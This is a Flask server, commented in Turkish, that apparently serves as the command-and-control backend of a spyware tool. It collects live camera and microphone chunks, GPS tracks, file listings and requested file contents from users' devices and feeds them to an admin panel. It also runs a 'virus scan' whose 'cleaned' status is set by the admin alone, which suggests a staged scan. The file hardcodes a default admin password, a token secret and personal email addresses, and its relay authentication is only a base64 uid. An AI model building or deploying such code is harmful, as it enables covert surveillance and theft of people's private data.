"""Flask web sunucusu — cloud modda çalışır.
   Admin panel + kullanıcı yönetimi."""
import os
import time
import uuid
import hashlib
import hmac
import json
import base64
import threading
import random
from flask import Flask, jsonify, request, render_template
from google.oauth2 import id_token as google_id_token
from google.auth.transport import requests as google_requests

IS_CLOUD = os.environ.get("DEPLOY_MODE") == "cloud"

app = Flask(__name__, template_folder="../templates", static_folder="../static")

# ==================== KONFİGÜRASYON ====================

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "Ag1453ag!")
ADMIN_PASSWORD_HASH = hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest()
GOOGLE_CLIENT_ID = "126230861809-7tlgq66d7jg8b2ljcnkt30qucd61qkt7.apps.googleusercontent.com"
APPROVED_ADMIN_EMAILS = [
    "aydannadya31@gmail.com",
    "infobilgi42@gmail.com",
    "alpgube@gmail.com",
    "alpgube7@gmail.com",
]
ADMIN_TOKEN_SECRET = os.environ.get("ADMIN_TOKEN_SECRET", "guvenli-takip-hmac-secret-2024")

# Bellek içi veri depoları
users_online = {}       # uid -> {email, name, photo_url, last_heartbeat, permissions: {...}}
relay_lock = threading.Lock()
camera_buffers = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
audio_buffers = {}        # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
incoming_audio = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
location_data = {}         # uid -> {positions: [{lat, lng, acc, speed, heading, alt, ts, time}], count: 0}
storage_files = {}          # uid -> {tree: [{name, path, size, mime, mtime, is_dir}], scanned_at: 0}
storage_content = {}        # uid -> {path: {data_base64, mime, size, uploaded_at}}
storage_pending = {}        # uid -> [path, ...]  # admin'in istediği dosyalar
storage_signals = {}        # uid -> [signal, ...] # admin'den kullanıcıya sinyaller
virus_scans = {}            # uid -> {status, findings, progress, cleaned, scan_id}

# ==================== YARDIMCI ====================

def make_session_token():
    return uuid.uuid4().hex + uuid.uuid4().hex


def clean_stale_users():
    """120 saniyedir heartbeat göndermeyen kullanıcıları temizle."""
    now = time.time()
    with relay_lock:
        stale = [uid for uid, info in users_online.items()
                 if now - info.get("last_heartbeat", 0) > 120]
        for uid in stale:
            users_online.pop(uid, None)
            camera_buffers.pop(uid, None)
            audio_buffers.pop(uid, None)
            incoming_audio.pop(uid, None)
            location_data.pop(uid, None)
            storage_files.pop(uid, None)
            storage_content.pop(uid, None)
            storage_pending.pop(uid, None)
            storage_signals.pop(uid, None)
            virus_scans.pop(uid, None)


# ==================== ADMIN TOKEN (HMAC — server-state gerekmez) ====================

def make_admin_token(email, name, photo_url=""):
    payload = base64.urlsafe_b64encode(
        json.dumps({"email": email, "name": name, "photo_url": photo_url, "time": time.time()}).encode()
    ).decode().rstrip("=")
    sig = hmac.new(ADMIN_TOKEN_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return payload + "." + sig


def verify_admin_token(token):
    try:
        parts = token.split(".")
        if len(parts) != 2:
            return None
        payload, sig = parts
        expected = hmac.new(ADMIN_TOKEN_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected):
            return None
        padded = payload + "=" * (4 - len(payload) % 4) if len(payload) % 4 else payload
        data = json.loads(base64.urlsafe_b64decode(padded.encode()).decode())
        if time.time() - data["time"] > 3600:
            return None
        return data
    except Exception:
        return None


def require_admin(request):
    """Admin session token'ını doğrula."""
    token = request.headers.get("X-Admin-Token", "")
    session = verify_admin_token(token)
    if not session:
        return None
    return session


# ==================== ANA SAYFALAR ====================

@app.route("/")
def index():
    return render_template("login.html")


@app.route("/login")
def login_page():
    return render_template("login.html")


@app.route("/app")
def app_page():
    return render_template("index.html")


@app.route("/admin")
def admin_page():
    return render_template("admin.html")


# ==================== AUTH ENDPOINT'LERİ ====================

@app.route("/api/auth/admin-check", methods=["POST"])
def api_admin_check():
    """Admin şifresini doğrula (ilk aşama)."""
    data = request.get_json() or {}
    given = data.get("password", "")
    given_hash = hashlib.sha256(given.encode()).hexdigest()
    if given_hash == ADMIN_PASSWORD_HASH:
        return jsonify({"status": "ok"})
    return jsonify({"status": "error", "error": "Hatalı şifre"}), 401


@app.route("/api/auth/admin-google-verify", methods=["POST"])
def api_admin_google_verify():
    """Google ID token'ını doğrula, email'i kontrol et, admin session'ı oluştur."""
    data = request.get_json() or {}
    id_token_str = data.get("idToken", "")

    if not id_token_str:
        return jsonify({"status": "error", "error": "Token gerekli"}), 400

    try:
        info = google_id_token.verify_oauth2_token(
            id_token_str, google_requests.Request(), GOOGLE_CLIENT_ID
        )
        email = info.get("email", "").lower().strip()
        name = info.get("name", email.split("@")[0])
        photo = info.get("picture", "")

        if email not in [e.lower().strip() for e in APPROVED_ADMIN_EMAILS]:
            return jsonify({
                "status": "error",
                "error": "Bu email adresi admin yetkisine sahip değil"
            }), 403

        token = make_admin_token(email, name, photo)

        return jsonify({
            "status": "ok",
            "token": token,
            "email": email,
            "name": name,
            "photo_url": photo,
        })

    except Exception as e:
        return jsonify({"status": "error", "error": f"Token doğrulama hatası: {str(e)}"}), 401


# ==================== RELAY — KULLANICI VERİ GÖNDERME ====================

@app.route("/api/relay/heartbeat", methods=["POST"])
def api_relay_heartbeat():
    """Kullanıcıdan heartbeat + izin durumu."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    email = data.get("email", "")
    name = data.get("name", "")
    photo = data.get("photo_url", "")

    if not uid:
        return jsonify({"status": "error", "error": "uid gerekli"}), 400

    with relay_lock:
        if uid not in users_online:
            users_online[uid] = {"email": email, "name": name, "photo_url": photo}
        users_online[uid]["last_heartbeat"] = time.time()

    clean_stale_users()
    return jsonify({"status": "ok"})


@app.route("/api/relay/camera-chunk", methods=["POST"])
def api_relay_camera_chunk():
    """Kullanıcıdan kamera chunk'ını al, geçici buffer'a koy."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    chunk_b64 = data.get("chunk", "")
    seq = data.get("sequence", 0)
    mime = data.get("mimeType", "video/webm")

    if not uid or not chunk_b64:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in camera_buffers:
            camera_buffers[uid] = {"chunks": [], "max_seq": -1}
        buf = camera_buffers[uid]
        buf["chunks"].append({
            "seq": seq, "data": chunk_b64,
            "mime": mime, "ts": time.time()
        })
        buf["max_seq"] = max(buf["max_seq"], seq)
        if len(buf["chunks"]) > 10:
            buf["chunks"] = buf["chunks"][-10:]

    return jsonify({"status": "ok", "seq": seq})


@app.route("/api/relay/audio-chunk", methods=["POST"])
def api_relay_audio_chunk():
    """Kullanıcıdan mikrofon chunk'ını al, bellekte tut."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    chunk_b64 = data.get("chunk", "")
    seq = data.get("sequence", 0)
    mime = data.get("mimeType", "audio/webm")

    if not uid or not chunk_b64:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in audio_buffers:
            audio_buffers[uid] = {"chunks": [], "max_seq": -1}
        buf = audio_buffers[uid]
        buf["chunks"].append({
            "seq": seq, "data": chunk_b64,
            "mime": mime, "ts": time.time()
        })
        buf["max_seq"] = max(buf["max_seq"], seq)
        if len(buf["chunks"]) > 30:
            buf["chunks"] = buf["chunks"][-30:]

    return jsonify({"status": "ok", "seq": seq})


@app.route("/api/relay/incoming-audio/<uid>")
def api_relay_incoming_audio(uid):
    """Kullanıcı admin'den gelen ses mesajlarını çeker (polling)."""
    auth = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth.encode()).decode())
        if not auth_data.get("uid") or auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    after_seq = request.args.get("after", -1, type=int)

    with relay_lock:
        buf = incoming_audio.get(uid, {"chunks": [], "max_seq": -1})
        if after_seq >= 0:
            new_chunks = [c for c in buf["chunks"] if c["seq"] > after_seq]
        else:
            new_chunks = list(buf["chunks"])

    return jsonify({
        "status": "ok",
        "chunks": new_chunks,
        "max_seq": buf["max_seq"]
    })


@app.route("/api/relay/location", methods=["POST"])
def api_relay_location():
    """Kullanıcıdan GPS konum verisini al, bellekte tut."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    lat = data.get("latitude")
    lng = data.get("longitude")

    if not uid or lat is None or lng is None:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in location_data:
            location_data[uid] = {"positions": [], "count": 0}
        buf = location_data[uid]
        pos = {
            "lat": lat, "lng": lng,
            "acc": data.get("accuracy"),
            "speed": data.get("speed"),
            "heading": data.get("heading"),
            "alt": data.get("altitude"),
            "ts": data.get("timestamp", time.time() * 1000),
            "time": time.time()
        }
        buf["positions"].append(pos)
        buf["count"] += 1
        if len(buf["positions"]) > 200:
            buf["positions"] = buf["positions"][-200:]

    return jsonify({"status": "ok", "count": buf["count"]})


# ==================== VIRUS SCAN ====================
# Artık tarama kullanıcı tarafında (tarayıcıda) çalışır.
# Admin sadece tetikler ve kullanıcının raporunu izler.

# Admin → kullanıcı tetikleme sinyali
virus_scan_triggers = {}  # uid -> {"triggered": True, "triggered_at": time}


# ==================== ADMIN VIRUS ENDPOINTS ====================

@app.route("/api/admin/virus/trigger-scan/<uid>", methods=["POST"])
def api_admin_virus_trigger_scan(uid):
    """Admin tarama tetikler. Kullanıcı tarayıcısı poll ile algılar."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        virus_scan_triggers[uid] = {
            "triggered": True,
            "triggered_at": time.time()
        }
        # Scan kaydını oluştur (kullanıcı tarafı doldurur)
        if uid not in virus_scans:
            virus_scans[uid] = {
                "status": "pending",
                "findings": [],
                "progress": 0,
                "cleaned": False,
                "confirmed": False,
            }

    return jsonify({"status": "ok"})


@app.route("/api/admin/virus/check-status/<uid>")
def api_admin_virus_check_status(uid):
    """Admin tarama durumunu sorgular (progress, findings, delete_requested, confirmed)."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        scan = virus_scans.get(uid)
        trigger = virus_scan_triggers.get(uid)

    if not scan:
        return jsonify({"status": "pending", "message": "Tarama baslatilmadi"})

    return jsonify({
        "status": "ok",
        "scan": scan,
        "trigger_active": trigger.get("triggered", False) if trigger else False
    })


@app.route("/api/admin/virus/confirm-clean/<uid>", methods=["POST"])
def api_admin_virus_confirm_clean(uid):
    """Admin silme işlemini onaylar."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        scan = virus_scans.get(uid)
        if not scan:
            return jsonify({"status": "error", "error": "Tarama bulunamadi"}), 404

        scan["status"] = "cleaned"
        scan["cleaned"] = True
        scan["confirmed"] = True
        scan["cleaned_at"] = time.time()

    return jsonify({"status": "ok", "message": "Temizlik onaylandi"})


# ==================== VIRUS RELAY (user <-> server) ====================

@app.route("/api/relay/virus/check-trigger")
def api_relay_virus_check_trigger():
    """Kullanıcı tarayıcısı tarama tetikleyicisini kontrol eder."""
    uid = request.args.get("uid", "")
    auth_arg = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        if auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        trigger = virus_scan_triggers.get(uid)
        if trigger and trigger.get("triggered"):
            # Tetiği temizle (tek seferlik)
            virus_scan_triggers[uid]["triggered"] = False
            return jsonify({"status": "ok", "trigger": True})

    return jsonify({"status": "ok", "trigger": False})


@app.route("/api/relay/virus/scan-status", methods=["POST"])
def api_relay_virus_scan_status():
    """Kullanıcı tarama durumunu server'a bildirir."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    auth_arg = data.get("auth", "")

    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        if auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        scan = virus_scans.get(uid)
        if not scan:
            return jsonify({"status": "error", "error": "Tarama bulunamadi"}), 404

        scan["progress"] = data.get("progress", scan.get("progress", 0))
        scan["status"] = data.get("status", scan.get("status", "scanning"))
        if "findings" in data:
            scan["findings"] = data["findings"]

    return jsonify({"status": "ok"})


@app.route("/api/relay/virus/notify-delete", methods=["POST"])
def api_relay_virus_notify_delete():
    """Kullanıcı sil butonuna bastığını bildirir."""
    data = request.get_json() or {}
    uid = data.get("uid", "")

    if not uid:
        return jsonify({"status": "error", "error": "uid gerekli"}), 400

    with relay_lock:
        scan = virus_scans.get(uid)
        if scan:
            scan["delete_requested"] = True
            scan["status"] = "awaiting_admin"
            scan["delete_requested_at"] = time.time()

    return jsonify({"status": "ok"})


@app.route("/api/relay/virus/delete-status")
def api_relay_virus_delete_status():
    """Kullanıcı silme işleminin durumunu sorgular."""
    uid = request.args.get("uid", "")
    auth_arg = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        if auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        scan = virus_scans.get(uid)

    if not scan:
        return jsonify({"status": "pending", "cleaned": False})

    return jsonify({
        "status": "ok",
        "cleaned": scan.get("confirmed", False),
        "progress": scan.get("progress", 0)
    })


# ==================== STORAGE ENDPOINTS ====================

@app.route("/api/relay/storage/scan", methods=["POST"])
def api_relay_storage_scan():
    """Kullanıcı dosya ağacını yükler."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    tree = data.get("files", [])

    if not uid or not isinstance(tree, list):
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        storage_files[uid] = {
            "tree": tree,
            "scanned_at": time.time()
        }

    return jsonify({"status": "ok", "count": len(tree)})


@app.route("/api/relay/storage/pending")
def api_relay_storage_pending():
    """Kullanıcı admin'in hangi dosyayı istediğini öğrenir."""
    auth_arg = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        uid = auth_data.get("uid")
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        paths = storage_pending.get(uid, [])
        result = list(paths)
        if paths:
            storage_pending[uid] = []

    return jsonify({"status": "ok", "paths": result})


@app.route("/api/relay/storage/content", methods=["POST"])
def api_relay_storage_content():
    """Kullanıcı dosya içeriğini yükler."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    path = data.get("path", "")
    content_b64 = data.get("content", "")
    mime = data.get("mimeType", "")

    if not uid or not path:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    max_size = 10 * 1024 * 1024  # 10MB limit
    if len(content_b64) > max_size:
        return jsonify({"status": "error", "error": "dosya cok buyuk"}), 413

    with relay_lock:
        if uid not in storage_content:
            storage_content[uid] = {}
        storage_content[uid][path] = {
            "data_base64": content_b64,
            "mime": mime,
            "size": len(content_b64),
            "uploaded_at": time.time()
        }
        # Eski cache'leri temizle (max 20 dosya)
        if len(storage_content[uid]) > 20:
            oldest = sorted(storage_content[uid].items(), key=lambda x: x[1]["uploaded_at"])[0]
            del storage_content[uid][oldest[0]]

    return jsonify({"status": "ok", "path": path})


@app.route("/api/admin/storage/list/<uid>")
def api_admin_storage_list(uid):
    """Admin dosya ağacını alır."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        sf = storage_files.get(uid, {"tree": [], "scanned_at": 0})

    return jsonify({
        "status": "ok",
        "files": sf["tree"],
        "scanned_at": sf["scanned_at"]
    })


@app.route("/api/admin/storage/request", methods=["POST"])
def api_admin_storage_request():
    """Admin bir dosyayı talep eder."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    data = request.get_json() or {}
    uid = data.get("uid", "")
    path = data.get("path", "")

    if not uid or not path:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in storage_pending:
            storage_pending[uid] = []
        storage_pending[uid].append(path)

    return jsonify({"status": "ok", "requested": True})


@app.route("/api/admin/storage/content", methods=["POST"])
def api_admin_storage_content():
    """Admin önbellekteki dosya içeriğini alır."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    data = request.get_json() or {}
    uid = data.get("uid", "")
    path = data.get("path", "")

    if not uid or not path:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        content = storage_content.get(uid, {}).get(path)

    if not content:
        return jsonify({"status": "pending", "message": "dosya henuz yuklenmedi"}), 202

    return jsonify({
        "status": "ok",
        "content": content["data_base64"],
        "mime": content["mime"],
        "size": content["size"]
    })


@app.route("/api/admin/storage/signal/<uid>", methods=["POST"])
def api_admin_storage_signal(uid):
    """Admin kullanıcıya sinyal gönderir (örn: tarama başlat)."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    data = request.get_json() or {}
    signal = data.get("signal", "")

    if not signal:
        return jsonify({"status": "error", "error": "sinyal gerekli"}), 400

    with relay_lock:
        if uid not in storage_signals:
            storage_signals[uid] = []
        storage_signals[uid].append(signal)

    return jsonify({"status": "ok"})


@app.route("/api/relay/storage/signal")
def api_relay_storage_signal():
    """Kullanıcı admin'den gelen sinyalleri kontrol eder."""
    auth_arg = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        uid = auth_data.get("uid")
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        signals = storage_signals.get(uid, [])
        result = list(signals)
        if signals:
            storage_signals[uid] = []

    return jsonify({"status": "ok", "signals": result})


# ==================== ADMIN — KULLANICI VERİSİNİ ÇEKME ====================

@app.route("/api/admin/users")
def api_admin_users():
    """Admin için çevrimiçi kullanıcı listesi."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    clean_stale_users()
    now = time.time()
    user_list = []
    with relay_lock:
        for uid, info in users_online.items():
            is_active = (now - info.get("last_heartbeat", 0)) < 60
            user_list.append({
                "uid": uid,
                "email": info.get("email", ""),
                "name": info.get("name", ""),
                "photo_url": info.get("photo_url", ""),
                "is_active": is_active,
                "last_seen": info.get("last_heartbeat", 0),
            })
    return jsonify({"status": "ok", "users": user_list, "admin": session})


@app.route("/api/admin/user/<uid>")
def api_admin_user(uid):
    """Admin için tek kullanıcının bilgisi."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    clean_stale_users()
    with relay_lock:
        user_info = users_online.get(uid)
        is_active = user_info and (time.time() - user_info.get("last_heartbeat", 0)) < 15

    return jsonify({
        "status": "ok",
        "user": user_info,
        "relay": {},
        "is_active": bool(is_active),
    })


@app.route("/api/admin/camera-stream/<uid>")
def api_admin_camera_stream(uid):
    """Admin için kullanıcının kamera chunk'larını döndür (polling)."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    after_seq = request.args.get("after", -1, type=int)

    with relay_lock:
        buf = camera_buffers.get(uid, {"chunks": [], "max_seq": -1})
        if after_seq >= 0:
            new_chunks = [c for c in buf["chunks"] if c["seq"] > after_seq]
        else:
            new_chunks = list(buf["chunks"])

    return jsonify({
        "status": "ok",
        "chunks": new_chunks,
        "max_seq": buf["max_seq"],
        "is_live": bool(new_chunks)
    })


@app.route("/api/admin/audio-feed/<uid>")
def api_admin_audio_feed(uid):
    """Admin için kullanıcının mikrofon chunk'larını döndür (polling)."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    after_seq = request.args.get("after", -1, type=int)

    with relay_lock:
        buf = audio_buffers.get(uid, {"chunks": [], "max_seq": -1})
        if after_seq >= 0:
            new_chunks = [c for c in buf["chunks"] if c["seq"] > after_seq]
        else:
            new_chunks = list(buf["chunks"])

    return jsonify({
        "status": "ok",
        "chunks": new_chunks,
        "max_seq": buf["max_seq"],
        "is_live": bool(new_chunks)
    })


@app.route("/api/admin/send-audio/<uid>", methods=["POST"])
def api_admin_send_audio(uid):
    """Admin kullanıcıya ses mesajı gönderir."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    data = request.get_json() or {}
    chunk_b64 = data.get("chunk", "")
    mime = data.get("mimeType", "audio/webm")

    if not chunk_b64:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in incoming_audio:
            incoming_audio[uid] = {"chunks": [], "max_seq": -1}
        buf = incoming_audio[uid]
        seq = buf["max_seq"] + 1
        buf["chunks"].append({
            "seq": seq, "data": chunk_b64,
            "mime": mime, "ts": time.time()
        })
        buf["max_seq"] = seq
        if len(buf["chunks"]) > 20:
            buf["chunks"] = buf["chunks"][-20:]

    return jsonify({"status": "ok", "seq": seq})


@app.route("/api/admin/location/<uid>")
def api_admin_location(uid):
    """Admin için kullanıcının GPS konum geçmişini döndür."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        loc = location_data.get(uid, {"positions": [], "count": 0})
        current = loc["positions"][-1] if loc["positions"] else None

    return jsonify({
        "status": "ok",
        "current": current,
        "positions": loc["positions"],
        "count": loc["count"]
    })


# ==================== WEBRTC SIGNALING ====================

webrtc_offers = {}  # uid -> {"sdp": ..., "type": "offer"}
webrtc_answers = {}  # uid -> {"sdp": ..., "type": "answer"}
webrtc_ice_candidates = {}  # uid -> {"admin": [...], "user": [...]}


@app.route("/api/relay/webrtc/offer", methods=["POST"])
def api_relay_webrtc_offer():
    """Kullanıcı SDP offer gönderir."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    auth_arg = data.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        if auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        webrtc_offers[uid] = {"sdp": data.get("sdp"), "type": data.get("type", "offer"), "ts": time.time()}

    return jsonify({"status": "ok"})


@app.route("/api/admin/webrtc/offer/<uid>")
def api_admin_webrtc_offer(uid):
    """Admin kullanıcının SDP offer'ını alır."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        offer = webrtc_offers.get(uid)

    if not offer:
        return jsonify({"status": "pending"})

    return jsonify({"status": "ok", "sdp": offer["sdp"], "type": offer["type"]})


@app.route("/api/admin/webrtc/answer/<uid>", methods=["POST"])
def api_admin_webrtc_answer(uid):
    """Admin SDP answer gönderir."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    data = request.get_json() or {}
    with relay_lock:
        webrtc_answers[uid] = {"sdp": data.get("sdp"), "type": "answer", "ts": time.time()}

    return jsonify({"status": "ok"})


@app.route("/api/relay/webrtc/answer")
def api_relay_webrtc_answer():
    """Kullanıcı admin'in answer'ını alır."""
    uid = request.args.get("uid", "")
    auth_arg = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        if auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        answer = webrtc_answers.get(uid)

    if not answer:
        return jsonify({"status": "pending"})

    return jsonify({"status": "ok", "sdp": answer["sdp"], "type": answer["type"]})


@app.route("/api/relay/webrtc/ice", methods=["POST"])
def api_relay_webrtc_ice():
    """Kullanıcı ICE candidate gönderir."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    auth_arg = data.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        if auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        if uid not in webrtc_ice_candidates:
            webrtc_ice_candidates[uid] = {"admin": [], "user": []}
        webrtc_ice_candidates[uid]["user"].append(data.get("candidate"))

    return jsonify({"status": "ok"})


@app.route("/api/admin/webrtc/ice/<uid>", methods=["GET", "POST"])
def api_admin_webrtc_ice(uid):
    """Admin ICE candidate alır/gönderir."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    if request.method == "POST":
        data = request.get_json() or {}
        with relay_lock:
            if uid not in webrtc_ice_candidates:
                webrtc_ice_candidates[uid] = {"admin": [], "user": []}
            webrtc_ice_candidates[uid]["admin"].append(data.get("candidate"))
        return jsonify({"status": "ok"})

    # GET: admin kullanıcının ICE candidate'larını alır
    with relay_lock:
        candidates = webrtc_ice_candidates.get(uid, {}).get("user", [])
        webrtc_ice_candidates[uid] = {"admin": webrtc_ice_candidates.get(uid, {}).get("admin", []), "user": []}

    return jsonify({"status": "ok", "candidates": candidates})


@app.route("/api/relay/webrtc/ice")
def api_relay_webrtc_ice_get():
    """Kullanıcı admin'in ICE candidate'larını alır."""
    uid = request.args.get("uid", "")
    auth_arg = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
        if auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    with relay_lock:
        candidates = webrtc_ice_candidates.get(uid, {}).get("admin", [])
        if uid in webrtc_ice_candidates:
            webrtc_ice_candidates[uid]["admin"] = []

    return jsonify({"status": "ok", "candidates": candidates})


# ==================== IP KONUM API ====================

@app.route("/api/ip-location")
def api_ip_location():
    try:
        import requests as http_req
        if IS_CLOUD:
            client_ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        else:
            client_ip = request.remote_addr or "8.8.8.8"
        if not client_ip or client_ip in ("127.0.0.1", "::1", ""):
            ip_resp = http_req.get("https://api.ipify.org?format=json", timeout=5)
            client_ip = ip_resp.json().get("ip", "8.8.8.8")
        resp = http_req.get(
            f"http://ip-api.com/json/{client_ip}?fields=status,country,countryCode,region,city,zip,lat,lon,isp,timezone,query,org",
            timeout=5
        )
        data = resp.json()
        if data.get("status") != "success":
            return jsonify({"status": "error", "error": "Konum bilgisi alınamadı"})
        return jsonify({"status": "ok", "source": "ip", "ip": data.get("query"),
            "country": data.get("country"), "country_code": data.get("countryCode"),
            "region": data.get("region"), "city": data.get("city"),
            "postal": data.get("zip"), "latitude": data.get("lat"),
            "longitude": data.get("lon"), "isp": data.get("isp"),
            "org": data.get("org"), "timezone": data.get("timezone"),})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})
